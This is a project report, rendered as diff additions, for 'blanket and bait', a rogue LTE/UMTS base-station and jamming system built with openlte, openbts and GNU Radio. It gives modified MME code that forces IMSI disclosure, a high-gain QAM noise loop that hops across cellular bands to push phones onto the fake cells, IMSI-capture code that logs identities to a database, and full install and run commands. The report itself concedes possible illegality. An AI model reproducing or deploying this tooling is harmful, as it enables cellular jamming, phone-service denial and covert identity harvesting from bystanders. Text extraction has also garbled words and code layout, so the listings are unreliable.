@@ -1,0 +1,5972 @@
+Project: blanket and bait
+
+Author: Nicholas V. Giamblanco
+
+For: OPR Laboratories
+
+Directed To: Dr. Reza Sedaghat
+
+//
+
+Contents
+
+0.4
+
+0.1 Common Terminology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+2
+0.2 Background and Motivation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+3
+0.3
+Installation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4
+0.3.1 Preamble . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4
+openlte . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0.3.2
+6
+0.3.3
+openbts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+6
+gnuradio . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0.3.4
+7
+srsLTE . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0.3.5
+7
+0.3.6
+mysql . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+7
+0.3.7 Python Packages, and the Python Package Manager: pip . . . . . . . . . . .
+8
+0.3.8 Notes
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+8
+0.3.9 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+8
+Implementation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+9
+0.4.1
+LTE fdd enb mme.cc . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+9
+0.4.2
+cell search.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
+elevated user.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
+0.4.3
+0.4.4
+qam noise.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13
+interact.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16
+0.4.5
+0.4.6
+umts cover.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
+intellis.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
+0.4.7
+0.4.8 Notes
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19
+0.5 Usage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
+0.5.1 Preamble . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
+0.5.2 Executing the Project . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
+0.5.3 Known Issues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
+0.5.4 How to Handle Errors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
+0.6 Appendix . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
+cell search.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
+elevated user.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
+interact.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32
+qam noise.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37
+umts cover.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40
+intellis.py . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43
+LTE fdd enb mme.cc . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46
+
+0.6.1
+0.6.2
+0.6.3
+0.6.4
+0.6.5
+0.6.6
+0.6.7
+
+1
+
+0.1 Common Terminology
+
+ UE: User Equipment or Mobile Device
+
+ eNodeB: Base Station
+
+ PDSCH: Physical Downlink Shared Channel
+
+ LTE: Long Term Evolution
+
+ XG: The X Generation of Communication technology
+
+ UMTS: Universal Mobile Telecommunications Service
+
+ QAM: Quadrature Amplitude Modulation
+
+ sudo: Super User Do
+
+2
+
+0.2 Background and Motivation
+
+In order to become acquainted with this project, it is important to understand the basis of this
+
+project. By analyzing the problem dened in [1], and following their solution, it is possible to exploit
+
+the handshaking protocol with LTE networks. Several known issues exist with LTE (outlined in
+
+[2], and [3]), which also revealed other possible exploits. This report does not contain specics on
+
+these methods, other than the implementation to demonstrate and use these exploits. It is up to
+
+the user to investigate the integrity of the implementation from their interpretation of the issues
+
+at hand.
+
+This project also targets 3G-UMTS networks, in which can be exploited without any modi-
+
+cation to the standard operation of the network. Hence, a standard implementation of a 3G system
+
+is required at most for exploitation. Again, this can be seen in [3].
+
+This was project was designed to restrict mobile device usage within a restricted area, which
+
+requires no human intervention. Specically, this project is to remotely block the perpetrators
+
+within an area in which mobile device usage is prohibited (i.e. Examination Room, Movie Theatre,
+
+etc.). Also, this project had to conrm to the laws put in place to mitigate the eects of cellular
+
+jamming, etc. After reading up on [1],[2], and [3] we applied the noted elements to create this
+
+project. The project consists of the following:
+
+ LTE eNodeB spoong 1 This forces a mobile device to be lured onto a rogue LTE network
+
+(this is an attack on availability, no practical attacks exist on the integrity and condentiality
+
+of LTE)
+
+ 3G-UMTS nodeB spoong 2 This forces a mobile device to be lured onto a rogue 3G network
+
+(this is an attack on availability, no practical attacks exist on the integrity and condentiality
+
+of 3G)
+
+ Signal Noise Generator 3 This is an attack on the availability of any signal processing device
+1This may fall outside the legal requirements, and may be an issue. Conduct any testing on minimal transmission
+
+power levels, and within a faraday cage.
+
+2This may fall outside the legal requirements, and may be an issue. Conduct any testing on minimal transmission
+
+power levels, and within a faraday cage.
+
+3The noise generated provides minute interference, however this may be consider as cell jamming/ signal jamming.
+
+3
+
+within a specied frequency range.
+
+These requirements were approved by OPR Labs.
+
+0.3 Installation
+
+The installation process of this project requires a UNIX operating system. Specically, this project
+
+requires the use of a Ubuntu-distro. The operating system used for testing was Ubuntu 16.04.
+
+Therefore, the user should create a boot-able thumb drive, and initiate the installation process.
+
+0.3.1 Preamble
+
+Once Ubuntu is installed, the project-installation can begin. Upon start-up, highlight the following
+
+option on the Grub menu:
+
+Advanced Options For Ubuntu
+
+Figure 1: GNU Grub Menu
+
+and ensure you select the start-up option with upstart. Proceed to login. Note: several extra
+
+packages will most likely be required during the following installation processes. On the event
+
+4
+
+that the project does not compile, or does not run, do not panic. Simply research the error with
+
+any search engine, and generally the problem will be resolved. It was not possible to list
+
+the potential missing packages as this is maintained by Ubuntu. These packages can be
+
+varied day-to-day, so once this project is stable, try to avoid updating system packages (other
+
+than security packages at which could compromise the system). It is also possible the installing
+
+the incorrect package may result in a corruption of the system. Take extreme care installing/un-
+
+installing packages.
+
+Also, recall that this project requires the targeting of 4G/LTE networks, and 3G-UMTS
+
+networks. 2G was not implemented as (1) 2G networks are being phased out, and (2) the open
+
+source software required for implementation is much too outdated. Therefore, the following Open
+
+Source packages were used to accomplish the task at hand:
+
+ openlte: Installation Priority: HIGH *Required for project operation
+
+ openbts: Installation Priority: HIGH *Required for project operation
+
+ gnuradio: Installation Priority: NORMAL *Required for project operation if openlte was not
+
+able to successfully install gnuradio.
+
+ srsLTE:
+
+Installation Priority: NORMAL *Required for project operation, however it is not
+
+limiting.
+
+You will require the use of the terminal, and may nd yourself in need of training. Please become
+
+up-to-date with typical terminal commands.
+
+5
+
+Figure 2: Terminal Process
+
+To begin the installation process, it may be benecial to create a working directory for all
+
+project les. Hence, you can use the command:
+
+$ mkdir yourDirName
+
+0.3.2
+
+openlte
+
+The installation method can be found at https : //sourceforge.net/p/openlte/wiki/Home/. Com-
+
+pletely follow the steps outlined from this open-source project. Failure to do so will result in
+
+non-compilation.
+
+ Description: This software provides a layer to layer implementation of an LTE network. It
+
+holds all required resources for fundamental operations.
+
+ Compatible Hardware Devices: bladeRF, and USRP B210
+
+0.3.3 openbts
+The installation method can be found at https : //umtrx.org/applications/openbts  umts/.
+
+Completely follow the steps outlined from this open-source project. Failure to do so will result in
+
+non-compilation.
+
+6
+
+ Description: This software provides a layer to layer implementation of a UMTS network. It
+
+holds all required resources for fundamental operations.
+
+ Compatible Hardware Devices: Only USRP N210
+
+0.3.4 gnuradio
+
+Only proceed with this installation process if openlte did not install gnuradio correctly. You can
+
+nd installation instructions here: https : //wiki.gnuradio.org/index.php/InstallingGR
+
+ Description: This software provides signal processing tools that can be physically realizable.
+
+ Compatible Hardware Devices: bladeRF, USRP N210 and USRP B210
+
+0.3.5 srsLTE
+
+The installation method can be found at https : //github.com/srsLTE/srsLTE. This is not re-
+
+quired for the fundamental operation of this project, but is required to identify new/surrounding
+
+cellular towers in a local area, and extract information required for the operation of this.
+
+ Description: This software provides a layer to layer implementation of an LTE network. It
+
+holds all required resources for fundamental operations.
+
+ Compatible Hardware Devices: bladeRF, and USRP B210
+
+0.3.6 mysql
+
+MySQL is a database management system which uses the Server Query Language (SQL) to parse
+
+through a database and read, update. create. and delete data (CRUD). This particular project
+
+require the use of a database: blanket and bait, and two stored procedures.
+
+Ensure you install this database management system by executing the following:
+
+sudo apt install mysql-dev
+
+7
+
+0.3.7 Python Packages, and the Python Package Manager: pip
+
+This project was implemented with a combination of programming languages and environments.
+
+However, Python v2.7 was used as a staple for the project. One benet of python is the number of
+
+maintained and included libraries which ease development needs. The Python environment even has
+
+a package manager, pip. This package manager is important during the installation/development
+
+phase of this project. To get pip, use the following command in terminal:
+
+$ sudo apt-get install python-pip python-dev build-essential
+
+Please read up on documentation surrounding this tool.
+
+0.3.8 Notes
+
+Due to the random nature of Open Source projects, dependencies on other Open Source projects,
+
+operating system packages and system tools, and various other requirements make aect the opera-
+
+tion of this project. There is absolutely no way to combat these eects, as these packages/projects
+
+used in this project are out of our control.
+
+It may be wise to keep a backup of all installation
+
+candidates of each of the Open Source packages listed above that had completed successfully on
+
+your host system. Hence, the stability of this project is dependent on these Open Source
+
+packages.
+
+0.3.9 Overview
+
+After copying the implementation les into the working directory (all the les provided by OPR,
+
+which are all the python related scripts highlighted in blue) you must also copy the following les:
+
+ From srsLTE: cell search, pdsch ue, these les are highlighted in yellow
+
+ From openbts: comp128, comp128, sipauthserve, transceiver, and OpenBTS  UMTS, these
+
+les are highlighted in green
+
+The nal structure you should attain appears as the following directory tree:
+yourProjectDir
+
+cell search.py
+elevated user.py
+
+8
+
+interact.py
+intellis.py
+parse.py
+qam noise.py
+umts cover.py
+cell search
+pdsch ue
+comp128
+sipauthserve
+transceiver
+OpenBTS-UMTS
+
+0.4 Implementation
+
+In this section, an exploration of the ideas of implementation are discussed and explained. This
+
+allows for complete transparency when utilizing this project. Every part of this project has an
+
+intended and useful purpose. There is also one modied le from an Open Source package.
+
+0.4.1
+
+LTE fdd enb mme.cc
+
+This particular le is included with the openlte software.
+
+It contains the necessary logic and
+
+structure to behave as the Mobility Management Entity (MME), which is part of the core of LTE.
+
+In layman terms, the MME handles any request the UE (User Equipment, i.e. Cell Phone) makes
+
+towards the eNodeB (Base Station). In particular, this system handles authentication procedures,
+
+handover procedures, and various other signaling and control protocols required by the LTE net-
+
+work. As noted in [1], there is a way to modify the MME, in order to perform an exploit within
+
+the LTE network. That is, it is possible to force any UE into locking onto a malicious eNodeB.
+
+In particular, upon reception of any request from the UE, the malicious eNodeB will send back an
+
+IMSI identity request. Upon reception of the UEs identity, it is possible to accept them onto the
+
+network. However, no authentication can take place as it is unfeasible (cryptographically speaking)
+
+to guess the key (Please refer to the Milenage protocol dened in the 3GPP standards).
+
+Therefore, as long as the UE is actively searching for a new eNodeB to camp on, or the
+
+connection between a previously connected eNodeB has very high SIR (Signal to Interference Ratio),
+
+9
+
+then this particular exploit can take place. Hence, this modications that have taken place are noted
+
+below:
+
+...
+
+case LIBLTE_MME_MSG_TYPE_ATTACH_REQUEST:
+//*** EDITED BY N. Giamblanco. 2:28pm 6/14/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+parse_attach_request(msg, &nas_msg->user, &nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_FAILURE:
+
+parse_authentication_failure(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_RESPONSE:
+
+parse_authentication_response(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_DETACH_REQUEST:
+//*** EDITED BY N. Giamblanco. 2:28pm 6/14/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+parse_detach_request(msg, nas_msg->user, nas_msg->rb);
+break;
+
+...
+
+case LTE_FDD_ENB_MME_STATE_REJECT:
+
+//** Edited by N. Giamblanco
+
+send_identity_request(user, rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//** End of Edit
+
+user->prepare_for_deletion();
+send_attach_reject(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_AUTHENTICATE:
+
+//** Edited by N. Giamblanco
+
+send_identity_request(user, rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//** End of Edit
+
+send_authentication_request(user, rb);
+break;
+
+...
+
+These modications allow for the request of UE identities, as well as luring and hooking of a UE
+
+to camp to a malicious eNodeB. 4
+
+0.4.2
+
+cell search.py
+
+The le cell search.py, is required for the identication of nearby cellular towers, or eNodeBs. In
+
+order to complete the above luring/hooking, the malicious eNodeB should be an impersonation of a
+
+4Modifying Open Source packages may result in corruption. Ensure that this is completed with due diligence.
+
+10
+
+legitimate eNodeB. Take the following example: Suppose there is an individual, namely, individual
+
+X. This particular individual is a police ocer. Now suppose there exists another individual
+
+who is able to completely impersonate X. This person can be referred to as Y . If Y completely
+
+impersonates X, how can one distinguish the two individuals? This example explains why eNodeB
+
+sning is a requirement.
+
+To accomplish this task of impersonation, the open source project srsLTE was used in accor-
+
+dance with a python script to extract nearby eNodeB congurations. Specically, the srsLTE open
+
+source software package contains an executable le named pdsch ue. The term pdsch corresponds
+
+to the physical downlink shared channel. This particular channel in the LTE network provides
+
+the UE with all required information for conguration parameters, and authentication material.
+
+Therefore, by utilizing this executable le and automating the use of this le with a python script,
+
+it is possible to search through all applicable bands within a specied geographic area. However,
+
+this requires a predecessor executable le from the srsLT E package. This executable is named
+
+cell search, and is able to identify active eNodeBs within a geographic area.
+
+This executable le parses the active eNodeBs by band. By identifying the active eNodeBs,
+
+it possible to specify the frequency on which the pdsch exists, and collect the conguration and
+
+identication material. Although this le is a requirement of the project, other les which require
+
+these conguration parameters have been hardcoded only for prototyping purposes. Therefore
+
+you should note this application is not exactly streamlined, and needs further work. That is, the
+
+extraction of conguration parameters is not automated, due to the complexity of the ASN1C
+
+encoding and decoding process. Several libraries have been identied which can complete the
+
+process, yet have limited APIs or no documentation. Therefore, this should be investigated. In
+
+the mean time, any hexadecimal string that is generated can be decoded through the use of this
+
+web application:
+
+http://www.marben-products.com/asn.1/services/decoder-asn1-lte.html
+
+To use this website 5, and extract the relevant conguration parameters, copy and paste the hex-
+
+adecimal output collected from pdsch ue, into the Decode from Direct Input box. Again it is
+
+5It may be wise to investigate how this particular website has implemented the ASN decoder
+
+11
+
+worth noting that this application is required only if moving to other geographic areas. This project
+
+has been congured to behave correctly within OPR-Labs, Toronto, Ontario.
+
+This particular le has four methods to which are used:
+
+1. parseASN1() *Requires ASN1 implementation
+
+2. update() Saves active eNodeBs to a le (.csv) for later access.
+
+3. getCellInfo() Captures the eNodeB conguration data, to be parsed by parseASN1()
+
+4. run() Initializes the program/script and executes the update() and getCellInfo() methods.
+
+Note: Refer to appendix for full implementation.
+
+0.4.3
+
+elevated user.py
+
+The le elevated user.py was created to establish permissions for users of this application. Since
+
+this projects purpose is to limit access of mobile device within a specied area, there are cases in
+
+which one or more users may have administrator privileges may be allowed to use their mobile
+
+device. This particular situation is possible since the le LTE fdd enb mme.cc can check against a
+
+list of authorized users before conducting the proposed attack. As noted within the description of
+
+LTE fdd enb mme.cc, the IMSI of a user is requested during the luring phase of operation. Therefore,
+
+if there are a group of authorized individuals that need access to mobile services, the collection of
+
+their respective IMSIs are compared against the requested IMSIs collected from the attack. If there
+
+is a one to one match with the IMSIs, then the user will be sent a reject request from the rogue
+
+network (this project), and re-authenticate on a legitimate eNodeB.
+
+This le has been implemented only to store the IM SIs of users who are authorized to use
+
+their cell phones. The le LTE fdd enb mme.cc has not yet been modied for checking incoming
+
+IMSIs against this particular list. This is required for future work. This was not an urgent matter,
+
+as proof of concept needed to be established.
+
+It is important to note that all captured IM SIs from this project, and the IM SIs of accepted
+
+users are stored within a mysql database. The database name is blanket and bait. To use mysql,
+
+refer to https : //dev.mysql.com/doc/.
+
+12
+
+0.4.4
+
+qam noise.py
+
+As noted in the description of LTE fdd enb mme.cc, a UE will only search for surrounding eNodeBs
+
+if and only if:
+
+ The UE has just booted, and is searching for an eNodeB to connect on, or
+
+ The UE has poor SIR, and requires a handover.
+
+By introducing a specic amount of noise in the atmosphere, it is possible to approach the second
+
+option to lure the UE to camp on a malicious eNodeB. Hence, this particular le provides only
+
+one method to do so. Specically, this le generates a random bit stream and modulates these
+
+sequences using QAM. This is important to note as LTE utilizes some variant of QAM (either 16,
+
+32 or 64 bit QAM). These signal processing techniques were completed with use of the gnuradio
+
+library, and the use of the bladeRF software dened radio. Attached is the signal processing block
+
+structure implemented within this le :
+
+Figure 3: QAM Block Structure
+
+However, due to physical limitations of software dene radio, and associated hardware, it is
+not possible to generate QAM modulated noise across all active bands of mobile servicing. Instead,
+
+13
+
+the noise is focused on certain areas of the network band with a time period T . Hence at every
+interval of t + T , the frequency band to target changes.
+
+def main(top_block_cls=top_block, options=None):
+
+tb = top_block_cls()
+tb.start(True)
+
+global isRunning
+isRunning=True
+
+j = 0.000000004
+i=int(800e6)
+
+q=0;
+freqs=[[2,4,5,13,17],[18,17,7,7,7],[19,21,9,9,9],[3,1,2,2,2],[9,6,9,9,9]]
+
+next_time=datetime.now()+period
+print(">>> Blanket is running.")
+print("\t\t\t\t<INFO> Blanket on Band %d \r"%(freqs[0][q]))
+while isRunning:
+
+tb.set_freq(i)
+#sys.stdout.write("\t\t\t\t\t\t\t\t<INFO>Frequency: "+str(i)+"Hz\r")
+i=int(randrange(freqs[1][q],freqs[2][q])*1e8+randrange(freqs[3][q],freqs[4][q])*1
+
+e7)
+
+if next_time<=datetime.now():
+
+next_time=datetime.now()+period
+if q<4:
+
+else:
+
+q=q+1
+
+q=0
+
+print("\t\t\t<INFO> Blanket on Band %d \r"%(freqs[0][q]))
+
+def switchBand(q):
+
+print("Switching...")
+
+def setTime(mins):
+
+global period
+period=timedelta(minutes=mins)
+
+def killMe():
+
+global isRunning
+isRunning=False
+return isRunning
+
+if __name__ == __main__:
+
+main()
+
+This particular implementation allows for complete utilization of the software dened radio, and
+allows this software system to target at least one band, and at most two bands at a time. By
+doing so, mobile devices are gradually lured onto the malicious base station congured through
+
+14
+
+It is worthwhile to mention that the software dened implementation of
+LTE fdd enb mme.cc.
+UMTS does not require any modication to its structure to conduct this project. Therefore, this is
+no purpose to mention this technology. This particular le is executed by a thread, in conjunction
+with other threads of operation. Attached below is the signal processing block denitions.
+
+##################################################
+# Blocks
+##################################################
+#self.osmosdr_sink_0 = osmosdr.sink( args="numchan=" + str(1) + " " +  )
+self.osmosdr_sink_0 = osmosdr.sink( args="bladerf numchan=1" )
+#self.osmosdr_sink_0 = osmosdr.sink( args="uhd numchan=1" )
+self.osmosdr_sink_0.set_sample_rate(samp_rate)
+self.osmosdr_sink_0.set_center_freq(700e6, 0)
+self.osmosdr_sink_0.set_freq_corr(0, 0)
+self.osmosdr_sink_0.set_gain(100, 0)
+self.osmosdr_sink_0.set_if_gain(20, 0)
+self.osmosdr_sink_0.set_bb_gain(20, 0)
+self.osmosdr_sink_0.set_antenna(, 0)
+self.osmosdr_sink_0.set_bandwidth(100e6, 0)
+
+self.digital_qam_mod_0 = digital.qam.qam_mod(
+
+constellation_points=16,
+mod_code="gray",
+differential=True,
+samples_per_symbol=8,
+excess_bw=0.5,
+verbose=False,
+log=False,
+)
+
+self.blocks_multiply_xx_2_0 = blocks.multiply_vcc(1)
+self.blocks_multiply_xx_2 = blocks.multiply_vcc(1)
+self.blocks_multiply_xx_0_0 = blocks.multiply_vcc(1)
+self.blocks_multiply_xx_0 = blocks.multiply_vcc(1)
+self.blocks_multiply_const_vxx_0_0 = blocks.multiply_const_vcc((100, ))
+self.blocks_multiply_const_vxx_0 = blocks.multiply_const_vcc((100, ))
+self.blocks_add_xx_0_1 = blocks.add_vcc(1)
+self.blocks_add_xx_0_0 = blocks.add_vcc(1)
+self.blocks_add_xx_0 = blocks.add_vcc(1)
+self.analog_sig_source_x_0_0_0_0 = analog.sig_source_c(samp_rate, analog.
+
+GR_SAW_WAVE, 10e3, 10, 0)
+
+self.analog_sig_source_x_0_0_0 = analog.sig_source_c(samp_rate, analog.GR_SAW_WAVE
+
+, 10e3, 10, 0)
+
+self.analog_sig_source_x_0_0 = analog.sig_source_c(samp_rate, analog.GR_COS_WAVE,
+
+10e3, 10, 0)
+
+self.analog_sig_source_x_0 = analog.sig_source_c(samp_rate, analog.GR_COS_WAVE,
+
+100e3, 10, 0)
+
+self.analog_random_source_x_0 = blocks.vector_source_b(map(int, numpy.random.
+
+randint(0, 255, 1000)), True)
+
+15
+
+0.4.5
+
+interact.py
+
+This le is eectively the core of the project. It maintains three threads,
+
+1. Thread 1 (blanket): This thread handles the QAM noise generation, by running the le
+
+qam noise.py as its method. All output from this method is displayed to notify the user of
+
+which band is being targeted for noise distribution
+
+2. Thread 2 (lte in): This thread launches a telnet session in which is required to communicate
+
+with the openlte software package. This thread in particular handles the dynamic congura-
+
+tions required by each new malicious eNodeB, specically conguring the MCC, MNC, cell id,
+
+n id cell, dl earfcn, and more. These parameters mentioned here are from the 3GPP stan-
+
+dard, to which the reader of this report should familiarize themselves with this standard. This
+
+is also covered briey through the openlte website.
+
+3. Thread 3 (lte out): This thread parses the output collected by the openlte software.
+
+Its
+
+purpose is to identify the IMSIs of lured users and add it to the mysql database for later use.
+
+Attached below are the denitions of the three threads:
+
+thread.start_new_thread(lte_in,())
+thread.start_new_thread(lte_out,())
+thread.start_new_thread(blanket,())
+
+while runBlank:
+
+pass
+
+It is now worth mentioning how this luring of UEs can only take place sequentially. Due to the
+
+limitations of software dened radios and the associated hardware, it is not possible to setup
+
+multiple eNodeBs with one software dene radio. With the provided hardware, it will never be
+
+possible to meet this desire. Therefore, each malicious eNodeB conguration will only last a
+
+total of T seconds, the same amount of time in which the QAM noise generator switches bands.
+
+Upon timeout, of after t + T seconds, the malicious eNodeB becomes disabled, allowing for a new
+
+conguration to be loaded onto the software dened radio.
+
+While the eNodeB is running, all output collected from openlte is parsed within thread 3,
+
+where the a search for incoming IMSIs is conducted.
+
+16
+
+#Going to Start Timer....
+#--Period is 1 Minute.
+#EDIT TEMP PERIOD =30 SECONDS
+period=timedelta(seconds=120)
+#period=timedelta(minutes=1)
+next_time=datetime.now()+period
+while True:
+
+line=tn.read_until("\n",60)
+#print("OUTPUT>>"+line)
+if "IMSI=" in line:
+
+try:
+
+#Going to extract the IMSI using Regular Expression.
+line= re.search(IMSI=(.*?) is,line).group(1)
+
+0.4.6
+
+umts cover.py
+
+This le has a similar behaviour to interact.py, in which the openbts open source software
+
+package can be dynamically set for each malicious nodeB conguration. That is, while changing
+
+the malicious eNodeB for the LTE network, the UMTS network should also follow suit, and change
+
+its respective conguration to match the network to which it is impersonating. The only dierence
+
+is that this particular script needs to execute out-of-sync (with respect to time) in order to execute
+
+properly. Due to an issue within the USRP/UHD library, programs that use these libraries do not
+
+distinguish which USRP to use at runtime. To operate this project, three software dene radios
+
+are used, two of which are USRPs. For the openlte, only the USRP B210 is compatible for LTE
+
+transmission. However, openbts has the capability to utilize both the USRP B210, and the USRP
+
+N210. This can cause either (1) a race condition, or (2) a conguration mis-match where the
+
+openlte software associates with incompatible hardware. To temporarily alleviate this issue, the
+
+timer for this script runs 30 seconds longer than the timer used for both the QAM noise generator,
+
+and the eNodeB script (interact.py.
+
+Note: this le could not be included with the intellis.py framework as it uses a subprocess
+to complete the desired task, as does interact.py. However, running multiple subprocesses within
+one Python script causes one child process to not run. To combat this eect, the operating system
+will execute this program independently in order to let the operating system handle the context
+switching, and to allow both child processes to run concurrently.
+
+...
+def run():
+
+17
+
+period=timedelta(seconds=120)
+chill=timedelta(seconds=5)
+setup=timedelta(seconds=70)
+q=str(os.getcwd())+"/./OpenBTS-UMTS"
+s="sudo"
+l="-p"
+r=""
+p="-S"
+i=5
+y=0
+setup_time=datetime.now()+setup
+chill_time=datetime.now()+chill
+while True:
+
+ps=Popen([s,l,r,p,q],stdin=PIPE)
+okay=True
+
+...
+
+It is also important to note that the openbts is inecient for dynamic changes. It requires that
+
+all conguration changes take place on a restart of the program/device. To automate this process,
+
+every malicious conguration required with this program to start twice:
+
+1. Start-Up for conguration load-in.
+
+2. Kill Process.
+
+3. Start-Up for nodeB launch.
+
+4. Repeat for each malicious nodeB.
+
+0.4.7
+
+intellis.py
+
+intellis.py provides the CLI for the user to interact with this project. This CLI provides ve
+
+options to the user:
+
+18
+
+[#######################################################]
+[Options:
+[
+[>>> [settings]. Enter Settings.
+[
+[>>> [run]. Run Intellis.
+[
+[>>> [clear]. Clears the terminal.
+[
+[>>> [quit | stop]. Stops Intellis.
+[
+[>>> [menu | help]. Displays This
+[
+[#######################################################]
+
+]
+]
+]
+]
+]
+]
+]
+]
+]
+]
+]
+]
+
+Figure 4: Example of the CLI
+
+Therefore, this could be considered the main() of the project. This particular script requires
+
+super user privileges, however its only purpose is to provides a central point of access to all as-
+
+pects/components of the project. The most notable commands is run and settings, which either
+
+execute the les interact.py and cell search.py, respectively.
+
+0.4.8 Notes
+
+As with any project, there are always modications to be made, bugs to be xed, etc. The
+
+software issues faced in this project are large, from orientating dierent programming languages,
+
+to interfering with software dene radios. Therefore, it may be wise to implement a version control
+
+system to help limit the amount of change that can occur over a time period.
+
+It is also important to note that this project has been optimized for the geographic setting
+
+of OPR labs. That is, the related conguration parameters have been hard-coded into several of
+
+the python scripts (i.e. interact.py, umts cover.py) purely for the sake of proof of concept. To
+
+create a feasible project, all processes included in this project need to be (1) streamlined, (2) have
+
+little to no code dependency to external projects (open source or not), and (3) be uid.
+
+19
+
+0.5 Usage
+
+0.5.1 Preamble
+
+This application is a CLI (Command Line Interface). To better manage terminal windows within a
+
+UNIX environment, it is best to use a terminal multiplexer, which allows several terminal sessions
+
+within one terminal window. A typical terminal multiplexer is tmux. To install this on a Debian
+
+system, enter:
+
+sudo apt-get install tmux
+
+0.5.2 Executing the Project
+
+Upon success. Navigate to the directory in which all the .py les exist. You can use the terminal
+
+to accomplish this task:
+
+$ cd /path/to/dir/with/py/files
+
+By using tmux, split the window into 4 segments, where the boundary of intersection should look
+
+like a cross.
+
+Figure 5: Examples of tmux in operation
+
+Execute the following commands to complete this:
+
+20
+
+$ tmux
+
+$ tmux split-window
+
+At this instant, press Ctrl+b+(the up arrow key) to enter back into the rst multiplexed
+
+window. Within the window enter:
+
+$ tmux split-window -h
+
+Now, press Ctrl+b+the down arrow key and execute:
+
+$ tmux split-window -h
+
+The USRP B210 and BladeRF should be connected to the PC at this moment. Beginning in any
+
+one of the multiplexed windows, execute:
+
+$ sudo LTE_fdd_enodeb
+
+This begins the LTE process needed for LTE operations with the B210 device. In Another Window,
+
+execute:
+
+$ sudo python intellis.py
+
+This will bring up a CLI. Enter run. This will ask you for a password used for authentication
+
+within a MySQL database. You must have installed the MySQL Ubuntu software package, and have
+
+setup an appropriate password with this software. If authentication is successful, you can continue
+
+with normal operation. At this moment, the automated LTE target and capture methodology is
+
+employed. No other action is required for this process. However, this program places a dependency
+
+on another programs operational standards. Due to an uncertain race condition, not all hardware
+
+can be congured at once. That is, the USRP B210 device (the software dened radio used for
+
+LTE transmissions) must be transmitting before the USRP N210 can be plugged in an congured.
+
+Hence, after a red LED is active on the USRP B210, proceed with the following:
+
+$ sudo ifconfig <interface> 192.168.10.1/24
+
+where < interface > may be eth0, en0, or something else. You can discover the interface name
+
+through:
+
+$ ifconfig -a
+
+21
+
+With the remaining window, execute:
+
+$ sudo python umts_cover.py
+
+And this will now automate the process of 3G-UMTS based exploits. At this point, no more user
+
+input is required due to the provided automation.
+
+Other options exist in the intellis.py script, however is not pertinent to the complete
+
+operation of the project. These options could be omitted if need be.
+
+0.5.3 Known Issues
+
+Having three software dened radios operating at once places extreme stress on the operating
+
+system, and the hardware of said system. The experience stress on the system sometimes cause
+
+the program to crash, in which case you may need to restart the project. Please operate only this
+
+project at runtime. Close any other running application(s). As noted previously, there is a known
+
+bug in which the host system can associate the USRP B210 with openbts, and USRP N210 with
+
+openlte. However, openlte is not compatible with the USRP N210, and will cause an error. This
+
+is due to a race condition within the USRP libraries installed with openlte, or gnuradio. To
+
+combat this issue, following the operating instructions exactly. It is also known that the openlte
+
+process will sometimes die unexpectedly. The cause is not known.
+
+During operation of the umts cover.py script, there are two phases which take place. The
+
+program begins and congures the device. However, due to the nature of the openbts imple-
+
+mentation, the software dened radio requires a restart/refresh. If the program is killed anytime
+
+before this conguration process is complete, the program will become invalid and a re-installation
+
+of openbts is required. After this conguration process has taken place, it is okay to end the
+
+program.
+
+0.5.4 How to Handle Errors
+
+Upon the discovery of an error, please exit all windows, and kill all processes related to this
+
+project. Try to restart the program by following the steps outlined in usage. If this leads to failure,
+
+then restart the system and try again. If further errors strike/persist, this has not been
+
+22
+
+documented and hence is not within the scope of this report. It is also worth mentioning
+
+again, that this project is unstable, and may not be able to operate in the future due to its severe
+
